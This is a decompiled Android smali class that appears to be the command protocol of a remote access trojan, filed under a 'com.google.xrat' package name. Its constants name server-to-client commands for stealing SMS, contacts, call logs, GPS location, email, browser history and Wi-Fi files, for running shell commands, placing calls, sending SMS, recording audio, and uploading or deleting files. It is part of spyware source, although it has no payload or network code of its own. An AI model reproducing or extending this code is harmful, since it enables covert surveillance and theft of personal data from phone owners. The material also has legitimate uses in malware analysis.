.class public Lcom/google/xrat/protocol/Protocol;
.super Ljava/lang/Object;


# static fields
.field public static final ACK_GIVE_CALL:S = 0xd1s

.field public static final ACK_SEND_SMS:S = 0xd3s

.field public static final ACK_TOAST_MSG:S = 0xd2s

.field public static final CONNECT:S = 0xc9s

.field public static final C_TO_S:S = 0xc8s

.field public static final DATA_BROWER_HISTORY:S = 0xf5s

.field public static final DATA_BROWER_HISTORY1:S = 0xf7s

.field public static final DATA_CALLLOGS:S = 0xcds

.field public static final DATA_CONTACTS:S = 0xd4s

.field public static final DATA_CONTINUE_DOWNFILE:S = 0xdas

.field public static final DATA_DIR:S = 0xcfs

.field public static final DATA_DOWNFILE:S = 0xd9s

.field public static final DATA_EMAIL:S = 0xf2s

.field public static final DATA_FILE:S = 0xd0s

.field public static final DATA_FIXTIMERECORD:S = 0xf6s

.field public static final DATA_GPS:S = 0xces

.field public static final DATA_GPS_AUTO:S = 0xe7s

.field public static final DATA_JIZHAN:S = 0xe6s

.field public static final DATA_MONITORNUM:S = 0xd8s

.field public static final DATA_MONITORNUM_SET_OK:S = 0xd7s

.field public static final DATA_MSG:S = 0xccs

.field public static final DATA_NO_PRIVILEGE:S = 0xe5s

.field public static final DATA_PHONE_INFO:S = 0xcbs

.field public static final DATA_RECORD:S = 0xdes

.field public static final DATA_REMARK:S = 0xd5s

.field public static final DATA_ROOT_FILE:S = 0xf0s

.field public static final DATA_SAVE_ALL_CALLS:S = 0xe2s

.field public static final DATA_SAVE_ALL_CONTACTS:S = 0xe0s

.field public static final DATA_SAVE_ALL_MSG:S = 0xe1s

.field public static final DATA_SAVE_ALL_PHONE_INFO:S = 0xe3s

.field public static final DATA_SAVE_FILE_TREE:S = 0xe4s

.field public static final DATA_SHELL:S = 0xd6s

.field public static final DATA_SHOW_MSG:S = 0xf4s

.field public static final DATA_UPLOADFILE:S = 0xdbs

.field public static final DATA_UPLOADFILE_ACK:S = 0xdds

.field public static final DATA_UPLOADFILE_OK:S = 0xdcs

.field public static final DATA_WIFI_FILE:S = 0xf1s

.field public static final DATA_XSHELL:S = 0xdfs

.field public static final DISCONNECT:S

.field public static final DO_BROWER_HISTORY:S

.field public static final DO_CALL:S

.field public static final DO_DELAY_RECORD:S

.field public static final DO_DELETEFILE:S

.field public static final DO_DOWNFILE:S

.field public static final DO_GET_EMAIL:S

.field public static final DO_GET_MONITORNUM:S

.field public static final DO_GET_ROOT_FILE:S

.field public static final DO_GET_SDCARD:S

.field public static final DO_GET_WIFI_FILE:S

.field public static final DO_REMARK:S

.field public static final DO_SAVE_ALL:S

.field public static final DO_SET_MONITORNUM:S

.field public static final DO_SHELL:S

.field public static final DO_SMS:S

.field public static final DO_START_RECORD:S

.field public static final DO_STOP_RECORD:S

.field public static final DO_TOAST:S

.field public static final DO_UPLOADFILE:S

.field public static final DO_XSHELL:S

.field public static final DRAFTBOX:I = 0x3

.field public static final GET_CALLLOGS:S

.field public static final GET_CONTCATS:S

.field public static final GET_FILE:S

.field public static final GET_GPS:S

.field public static final GET_MSG:S

.field public static final GET_PHONE_INFO:S

.field public static final HEART_BEAT_TEST_TIME:I = 0x3

.field public static final INBOX:I = 0x1

.field public static final INCOMING_TYPE:I = 0x1

.field public static final KEEP_CONNECT:S = 0xcas

.field public static final LIST_DIR:S

.field public static final MISSED_TYPE:I = 0x3

.field public static final OUTBOX:I = 0x2

.field public static final OUTCOMING_TYPE:I = 0x2

.field private static S_TO_C:S


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/16 v0, 0x64

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    const/16 v0, 0x65

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DISCONNECT:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x2

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->GET_PHONE_INFO:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x3

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->GET_MSG:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x4

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->GET_CONTCATS:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x5

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->GET_CALLLOGS:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x6

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->GET_GPS:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x7

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->LIST_DIR:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x8

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->GET_FILE:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x9

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_CALL:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0xa

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_SMS:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0xb

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_TOAST:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0xc

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_REMARK:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0xd

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_SHELL:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0xf

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_SET_MONITORNUM:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x10

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_GET_MONITORNUM:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x11

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_DOWNFILE:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x12

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_DELETEFILE:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x13

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_UPLOADFILE:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x15

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_START_RECORD:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x16

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_STOP_RECORD:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x17

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_XSHELL:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x18

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_SAVE_ALL:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x28

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_GET_ROOT_FILE:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x29

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_GET_WIFI_FILE:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x2a

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_GET_EMAIL:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x2b

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_DELAY_RECORD:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x2d

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_BROWER_HISTORY:S

    sget-short v0, Lcom/google/xrat/protocol/Protocol;->S_TO_C:S

    add-int/lit8 v0, v0, 0x2e

    int-to-short v0, v0

    sput-short v0, Lcom/google/xrat/protocol/Protocol;->DO_GET_SDCARD:S

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method
